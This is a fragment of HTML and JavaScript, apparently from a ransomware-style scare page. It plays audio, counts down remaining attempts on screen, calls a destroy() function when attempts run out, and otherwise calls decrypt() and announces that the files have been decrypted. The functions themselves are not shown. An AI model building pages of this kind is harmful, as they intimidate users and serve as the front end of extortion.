                document.getElementById('audio').play();

                
                attempts--;
                document.querySelector("#countdown").innerHTML = attempts;

                if (attempts <= 0) {
                    destroy();
                }

            } else {
                decrypt();
                window.alert("Your files have been decrypted and you can now turn off your computer")
            }
        }
    </script>

</head>
